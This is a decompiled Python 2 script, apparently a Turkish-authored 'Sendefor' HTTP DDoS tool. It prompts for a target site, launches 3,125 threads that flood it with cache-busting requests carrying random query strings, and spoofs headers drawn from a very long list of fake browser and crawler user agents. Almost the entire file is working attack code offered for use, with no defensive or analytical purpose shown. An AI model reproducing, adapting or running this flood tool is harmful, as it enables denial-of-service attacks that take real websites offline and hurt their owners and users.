# uncompyle6 version 3.2.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.14 (v2.7.14:84471935ed, Sep 16 2017, 20:25:58) [MSC v.1500 64 bit (AMD64)]
# Embedded file name: Sendefor.py
# Compiled at: 2018-08-31 16:17:02
import os, urllib2, sys, threading, random, re
url = ''
host = ''
headers_useragents = []
request_counter = 666
flag = 0
safe = 0

def inc_counter():
    global request_counter
    request_counter += 666


def set_flag(val):
    global flag
    flag = val


def set_safe():
    global safe
    safe = 1


def useragent_list():
    global headers_useragents
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
    headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
    headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
    headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
    headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
    headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
    headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
    headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
    headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
    headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
    headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
    headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
    headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
    headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
    headers_useragents.append('(DreamPassport/3.0; isao/MyDiGiRabi)')
    headers_useragents.append('(Privoxy/1.0)')
    headers_useragents.append('*/Nutch-0.9-dev')
    headers_useragents.append(':robot/1.0 (linux) ( admin e-mail: undefined http://www.neofonie.de/loesungen/search/robot.html)')
    headers_useragents.append('[various mobile device types] (compatible; Mediapartners-Google/2.1; +http://www.google.com/bot.html)')
    headers_useragents.append('+SitiDi.net/SitiDiBot/1.0 (+Have Good Day)')
    headers_useragents.append('123spider-Bot (Version: 1.02) powered by www.123spider.de')
    headers_useragents.append('192.comAgent')
    headers_useragents.append('1st ZipCommander (Net) - http://www.zipcommander.com/')
    headers_useragents.append('2Bone_LinkChecker/1.0 libwww-perl/5.64')
    headers_useragents.append('4anything.com LinkChecker v2.0')
    headers_useragents.append('8484 Boston Project v 1.0')
    headers_useragents.append('A1 Keyword Research/1.0.2 (+http://www.micro-sys.dk/products/keyword-research/) miggibot/2007.03.27')
    headers_useragents.append('A1 Sitemap Generator/1.0 (+http://www.micro-sys.dk/products/sitemap-generator/) miggibot/2006.01.24')
    headers_useragents.append('AbachoBOT')
    headers_useragents.append('AbachoBOT (Mozilla compatible)')
    headers_useragents.append('ABCdatos BotLink/5.xx.xxx#BBL')
    headers_useragents.append('Aberja Checkomat \tAberja Hybridsuchmaschine (Germany)')
    headers_useragents.append('abot/0.1 (abot; http://www.abot.com; abot@abot.com)')
    headers_useragents.append('About/0.1libwww-perl/5.47')
    headers_useragents.append('Accelatech RSSCrawler/0.4')
    headers_useragents.append('accoona \tAccoona Search robot')
    headers_useragents.append('Accoona-AI-Agent/1.1.1 (crawler at accoona dot com)')
    headers_useragents.append('Accoona-AI-Agent/1.1.2 (aicrawler at accoonabot dot com)')
    headers_useragents.append('Ace Explorer')
    headers_useragents.append('Ack (http://www.ackerm.com/)')
    headers_useragents.append('AcoiRobot')
    headers_useragents.append('Acoon Robot v1.50.001')
    headers_useragents.append('Acoon Robot v1.52 (http://www.acoon.de)')
    headers_useragents.append('Acoon-Robot 4.0.x.[xx] (http://www.acoon.de)')
    headers_useragents.append('Acoon-Robot v3.xx (http://www.acoon.de and http://www.acoon.com)')
    headers_useragents.append('Acorn/Nutch-0.9 (Non-Profit Search Engine; acorn.isara.org; acorn at isara dot org)')
    headers_useragents.append('ActiveBookmark 1.x')
    headers_useragents.append('Activeworlds')
    headers_useragents.append('ActiveWorlds/3.xx (xxx)')
    headers_useragents.append('Ad Muncher v4.xx.x')
    headers_useragents.append('Ad Muncher v4x Build xxxxx')
    headers_useragents.append('Adaxas Spider (http://www.adaxas.net/)')
    headers_useragents.append('AdsBot-Google (+http://www.google.com/adsbot.html)')
    headers_useragents.append('Advanced Browser (http://www.avantbrowser.com)')
    headers_useragents.append('AESOP_com_SpiderMan')
    headers_useragents.append('agadine/1.x.x (+http://www.agada.de)')
    headers_useragents.append('AgentName/0.1 libwww-perl/5.48')
    headers_useragents.append('Agent-SharewarePlazaFileCheckBot/2.0+(+http://www.SharewarePlaza.com')
    headers_useragents.append('AIBOT/2.1 By +(www.21seek.com A Real artificial intelligence search engine China')
    headers_useragents.append('AideRSS/1.0 (aiderss.com)')
    headers_useragents.append('aipbot/1.0 (aipbot; http://www.aipbot.com; aipbot@aipbot.com')
    headers_useragents.append('aipbot/2-beta (aipbot dev; http://aipbot.com; aipbot@aipbot.com')
    headers_useragents.append('Akregator/1.2.9; librss/remnants')
    headers_useragents.append('Aladin/3.324')
    headers_useragents.append('Alcatel-BG3/1.0 UP.Browser/5.0.3.1.2')
    headers_useragents.append('Aleksika Spider/1.0 (+http://www.aleksika.com/)')
    headers_useragents.append('AlertInfo 2.0 (Powered by Newsbrain)')
    headers_useragents.append('AlkalineBOT/1.3')
    headers_useragents.append('AlkalineBOT/1.4 (1.4.0326.0 RTM)')
    headers_useragents.append('Allesklar/0.1 libwww-perl/5.46')
    headers_useragents.append('Alligator 1.31 (www.nearsoftware.com)')
    headers_useragents.append('Allrati/1.1 (+)')
    headers_useragents.append('AltaVista Intranet V2.0 AVS EVAL search@freeit.com\t ')
    headers_useragents.append('AltaVista Intranet V2.0 Compaq Altavista Eval sveand@altavista.net')
    headers_useragents.append('AltaVista Intranet V2.0 evreka.com crawler@evreka.com')
    headers_useragents.append('AltaVista V2.0B crawler@evreka.com')
    headers_useragents.append('amaya/x.xx libwww/x.x.x')
    headers_useragents.append('AmfibiBOT')
    headers_useragents.append('Amfibibot/0.06 (Amfibi Web Search; http://www.amfibi.com; agent@amfibi.com)')
    headers_useragents.append('Amfibibot/0.07 (Amfibi Robot; http://www.amfibi.com; agent@amfibi.com)')
    headers_useragents.append('amibot')
    headers_useragents.append('Amiga-AWeb/3.4.167SE')
    headers_useragents.append('AmigaVoyager/3.4.4 (MorphOS/PPC native)')
    headers_useragents.append('AmiTCP Miami (AmigaOS 2.04)')
    headers_useragents.append('Amoi 8512/R21.0 NF-Browser/3.3')
    headers_useragents.append('amzn_assoc')
    headers_useragents.append('AnnoMille spider 0.1 alpha - http://www.annomille.it')
    headers_useragents.append('annotate_google; http://ponderer.org/download/annotate_google.user.js')
    headers_useragents.append('Anonymized by ProxyOS: http://www.megaproxy.com')
    headers_useragents.append('Anonymizer/1.1')
    headers_useragents.append('AnswerBus (http://www.answerbus.com/)')
    headers_useragents.append('AnswerChase PROve x.0')
    headers_useragents.append('AnswerChase x.0')
    headers_useragents.append('ANTFresco/x.xx')
    headers_useragents.append('antibot-V1.1.5/i586-linux-2.2')
    headers_useragents.append('AnzwersCrawl/2.0 (anzwerscrawl@anzwers.com.au;Engine)')
    headers_useragents.append('A-Online Search')
    headers_useragents.append('Apexoo Spider 1.x')
    headers_useragents.append('Aplix HTTP/1.0.1')
    headers_useragents.append('Aplix_SANYO_browser/1.x (Japanese)')
    headers_useragents.append('Aplix_SEGASATURN_browser/1.x (Japanese)')
    headers_useragents.append('Aport')
    headers_useragents.append('appie 1.1 (www.walhello.com)')
    headers_useragents.append('Apple iPhone v1.1.4 CoreMedia v1.0.0.4A102')
    headers_useragents.append('Applebot')
    headers_useragents.append('Apple-PubSub/65.1.1')
    headers_useragents.append('ArabyBot (compatible; Mozilla/5.0; GoogleBot; FAST Crawler 6.4; http://www.araby.com;)')
    headers_useragents.append('ArachBot')
    headers_useragents.append('Arachnoidea (arachnoidea@euroseek.com)')
    headers_useragents.append('aranhabot')
    headers_useragents.append('ArchitextSpider')
    headers_useragents.append('archive.org_bot')
    headers_useragents.append('Argus/1.1 (Nutch; http://www.simpy.com/bot.html; feedback at simpy dot com)')
    headers_useragents.append('Arikus_Spider')
    headers_useragents.append('Arquivo-web-crawler (compatible; heritrix/1.12.1 +http://arquivo-web.fccn.pt)')
    headers_useragents.append('ASAHA Search Engine Turkey V.001 (http://www.asaha.com/)')
    headers_useragents.append('Asahina-Antenna/1.x')
    headers_useragents.append('Asahina-Antenna/1.x (libhina.pl/x.x ; libtime.pl/x.x)')
    headers_useragents.append('ask.24x.info')
    headers_useragents.append('AskAboutOil/0.06-rcp (Nutch; http://www.nutch.org/docs/en/bot.html; nutch-agent@askaboutoil.com)')
    headers_useragents.append('asked/Nutch-0.8 (web crawler; http://asked.jp; epicurus at gmail dot com)')
    headers_useragents.append('ASPSeek/1.2.5')
    headers_useragents.append('ASPseek/1.2.9d')
    headers_useragents.append('ASPSeek/1.2.x')
    headers_useragents.append('ASPSeek/1.2.xa')
    headers_useragents.append('ASPseek/1.2.xx')
    headers_useragents.append('ASPSeek/1.2.xxpre')
    headers_useragents.append('ASSORT/0.10')
    headers_useragents.append('asterias/2.0')
    headers_useragents.append('AtlocalBot/1.1 +(http://www.atlocal.com/local-web-site-owner.html)')
    headers_useragents.append('Atomic_Email_Hunter/4.0')
    headers_useragents.append('Atomz/1.0')
    headers_useragents.append('atSpider/1.0')
    headers_useragents.append('Attentio/Nutch-0.9-dev (Attentios beta blog crawler; www.attentio.com; info@attentio.com)')
    headers_useragents.append('AUDIOVOX-SMT5600')
    headers_useragents.append('augurfind')
    headers_useragents.append('augurnfind V-1.x')
    headers_useragents.append('AU-MIC/2.0 MMP/2.0')
    headers_useragents.append('autoemailspider')
    headers_useragents.append('autohttp')
    headers_useragents.append('autowebdir 1.1 (www.autowebdir.com)')
    headers_useragents.append('AV Fetch 1.0')
    headers_useragents.append('Avant Browser (http://www.avantbrowser.com)')
    headers_useragents.append('AVSearch-1.0(peter.turney@nrc.ca)')
    headers_useragents.append('AVSearch-2.0-fusionIdx-14-CompetitorWebSites')
    headers_useragents.append('AVSearch-3.0(AltaVista/AVC)')
    headers_useragents.append('AWeb')
    headers_useragents.append('axadine/ (Axadine Crawler; http://www.axada.de/; )')
    headers_useragents.append('AxmoRobot - Crawling your site for better indexing on www.axmo.com search engine.')
    headers_useragents.append('Azureus 2.x.x.x')
    headers_useragents.append('BabalooSpider/1.3 (BabalooSpider; http://www.babaloo.si; spider@babaloo.si)')
    headers_useragents.append('BaboomBot/1.x.x (+http://www.baboom.us)')
    headers_useragents.append('BackStreet Browser 3.x')
    headers_useragents.append('Baidu Bookmark Search')
    headers_useragents.append('Baidu Business Search')
    headers_useragents.append('Baidu Image Search')
    headers_useragents.append('Baidu Mobile Search')
    headers_useragents.append('Baidu News Search')
    headers_useragents.append('Baidu Union Search')
    headers_useragents.append('Baidu Video Search')
    headers_useragents.append('BaiduImagespider+(+http://www.baidu.jp/search/s308.html)')
    headers_useragents.append('BaiDuSpider')
    headers_useragents.append('Baiduspider+(+http://help.baidu.jp/system/05.html)')
    headers_useragents.append('Baiduspider+(+http://www.baidu.com/search/spider.htm)')
    headers_useragents.append('Baiduspider+(+http://www.baidu.com/search/spider_jp.html)')
    headers_useragents.append('Baiduspider-ads')
    headers_useragents.append('Baiduspider-cpro')
    headers_useragents.append('Baiduspider-favo')
    headers_useragents.append('Baiduspider-image')
    headers_useragents.append('Baiduspider-mobile')
    headers_useragents.append('Baiduspider-news')
    headers_useragents.append('Baiduspider-video')
    headers_useragents.append('Balihoo/Nutch-1.0-dev (Crawler for Balihoo.com search engine - obeys robots.txt and robots meta tags ; http://balihoo.com/index.aspx; robot at balihoo dot com)')
    headers_useragents.append('BanBots/1.2 (spider@banbots.com)')
    headers_useragents.append('Barca/2.0.xxxx')
    headers_useragents.append('BarcaPro/1.4.xxxx')
    headers_useragents.append('BarraHomeCrawler (albertof@barrahome.org)')
    headers_useragents.append('bCentral Billing Post-Process')
    headers_useragents.append('bdcindexer_2.6.2 (research@bdc)')
    headers_useragents.append('BDFetch')
    headers_useragents.append('BDNcentral Crawler v2.3 [en] (http://www.bdncentral.com/robot.html) (X11; I; Linux 2.0.44 i686)')
    headers_useragents.append('BeamMachine/0.5 (dead link remover of www.beammachine.net)')
    headers_useragents.append('beautybot/1.0 (+http://www.uchoose.de/crawler/beautybot/)')
    headers_useragents.append('BebopBot/2.5.1 ( crawler http://www.apassion4jazz.net/bebopbot.html)')
    headers_useragents.append('BeebwareDirectory/v0.01')
    headers_useragents.append('Big Brother (http://pauillac.inria.fr/~fpottier/)')
    headers_useragents.append('Big Fish v1.0')
    headers_useragents.append('BigBrother/1.6e')
    headers_useragents.append('BigCliqueBOT/1.03-dev (bigclicbot; http://www.bigclique.com; bot@bigclique.com)')
    headers_useragents.append('BIGLOTRON (Beta 2;GNU/Linux)')
    headers_useragents.append('Bigsearch.ca/Nutch-x.x-dev (Bigsearch.ca Internet Spider; http://www.bigsearch.ca/; info@enhancededge.com)')
    headers_useragents.append('Bilbo/2.3b-UNIX')
    headers_useragents.append('BilgiBetaBot/0.8-dev (bilgi.com (Beta) ; http://lucene.apache.org/nutch/bot.html; nutch-agent@lucene.apache.org)')
    headers_useragents.append('BilgiBot/1.0(beta) (http://www.bilgi.com/; bilgi at bilgi dot com)')
    headers_useragents.append('billbot wjj@cs.cmu.edu')
    headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
    headers_useragents.append('Bingbot')
    headers_useragents.append('Bitacle bot/1.1')
    headers_useragents.append('Bitacle Robot (V:1.0;) (http://www.bitacle.com)')
    headers_useragents.append('Biyubi/x.x (Sistema Fenix; G11; Familia Toledo; es-mx)')
    headers_useragents.append('Opera/9.99 (X11; U; sk)')
    headers_useragents.append('Orthogaffe')
    headers_useragents.append('ozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
    headers_useragents.append('Plus many more older versions/variations (see links for details)..')
    headers_useragents.append('psnsearch')
    headers_useragents.append('QuerySeekerSpider')
    headers_useragents.append('SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)')
    headers_useragents.append('seznambot')
    headers_useragents.append('SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
    headers_useragents.append('SiteSnagger')
    headers_useragents.append('Slurp')
    headers_useragents.append('sproose/0.1-alpha (sproose crawler; http://www.sproose.com/bot.html; crawler@sproose.com)')
    headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
    headers_useragents.append('Teleport')
    headers_useragents.append('TeleportPro')
    headers_useragents.append('teoma')
    headers_useragents.append('tnftp/20050625')
    headers_useragents.append('Twitterbot')
    headers_useragents.append('unknownght.com Web Server IIS vs Apache Survey. See Results at www.DNSRight.com')
    headers_useragents.append('WebCopier')
    headers_useragents.append('WebReaper')
    headers_useragents.append('WebStripper')
    headers_useragents.append('WebZIP')
    headers_useragents.append('wget')
    headers_useragents.append('Wget/1.10.1')
    headers_useragents.append('Wget/1.7')
    headers_useragents.append('Wget/1.8.1')
    headers_useragents.append('Wget/1.8.2')
    headers_useragents.append('Wget/1.9.1')
    headers_useragents.append('Xenu')
    headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
    headers_useragents.append('Yandex')
    headers_useragents.append('Yeti')
    headers_useragents.append('Zao')
    headers_useragents.append('Zealbot')
    headers_useragents.append('ZyBORG')
    return headers_useragents


def buildblock(size):
    out_str = ''
    for i in xrange(0, size):
        a = random.randint(100, 200)
        out_str += chr(a)

    return out_str


os.system('title Skylons Dos & color a & mode con cols=77 lines=25')
print '''
   _____                _       __           
  / ____|              | |     / _|          
 | (___   ___ _ __   __| | ___| |_ ___  _ __ 
  \___ \ / _ \ '_ \ / _` |/ _ \  _/ _ \| '__|
  ____) |  __/ | | | (_| |  __/ || (_) | |   
 |_____/ \___|_| |_|\__,_|\___|_| \___/|_|   
                                             
                                             

\n[+] Script Yazan : Sendefor \n[+] Script : HTTP / DDos \n'''

def httpcall(url):
    useragent_list()
    code = 0
    if url.count('?') > 0:
        param_joiner = '&'
    else:
        param_joiner = '?'
    request = urllib2.Request(url + param_joiner + buildblock(random.randint(10, 20)) + '=' + buildblock(random.randint(10, 30)))
    request.add_header('User-Agent', random.choice(headers_useragents))
    request.add_header('Cache-Control', 'no-cache')
    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    request.add_header('Referer', host)
    request.add_header('Keep-Alive', random.randint(110, 120))
    request.add_header('Connection', 'keep-alive')
    request.add_header('Host', host)
    try:
        urllib2.urlopen(request)
    except urllib2.HTTPError as e:
        set_flag(1)
        print '[+]=[+]=[+]=>> Sendefor [+]=[+] Attacking [+]=[+] ' + host + ' <<=[+]=[+]=[+]'
        code = 999
    except urllib2.URLError as e:
        sys.exit()
    else:
        inc_counter()
        urllib2.urlopen(request)

    return code


class HTTPThread(threading.Thread):

    def run(self):
        try:
            while flag < 2:
                code = httpcall(url)
                if (code == 999) & (safe == 1):
                    print '[+]=[+]=[+]=>> Sendefor [+]=[+] Attacking [+]=[+] ' + host + ' <<=[+]=[+]=[+]'
                    set_flag(2)

        except Exception as ex:
            pass


class MonitorThread(threading.Thread):

    def run(self):
        previous = request_counter
        while flag == 0:
            if (previous + 100 < request_counter) & (previous != request_counter):
                print '[+]=[+]=[+]=>> Sendefor [+]=[+] Attacking [+]=[+] ' + host + ' <<=[+]=[+]=[+]'
                previous = request_counter


url = raw_input('[*] Site: ')
m = re.search('https?\\://([^/]*)/?.*', url)
host = m.group(1)
os.system('ping 127.0.0.1 -n 1 -l 1 >nul & color b & cls')
for i in xrange(3125):
    os.system('title Sendefor Dos - Sendefor Attacking ' + host)
    t = HTTPThread()
    t.start()

t = MonitorThread()
t.start()